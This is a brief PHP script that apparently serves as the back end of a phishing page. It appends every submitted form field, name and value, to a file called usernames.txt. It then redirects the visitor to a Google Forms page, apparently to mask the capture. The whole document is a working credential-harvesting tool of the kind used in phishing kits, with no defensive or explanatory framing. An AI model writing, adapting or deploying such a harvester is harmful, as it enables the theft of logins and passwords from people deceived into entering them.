<?php
header ('Location:https://docs.google.com/forms/d/1AwU5iUZeBV0gSRe1G0hZFqeYASo1JqPLW0eyI6TmRYU/edit');
$handle = fopen("usernames.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>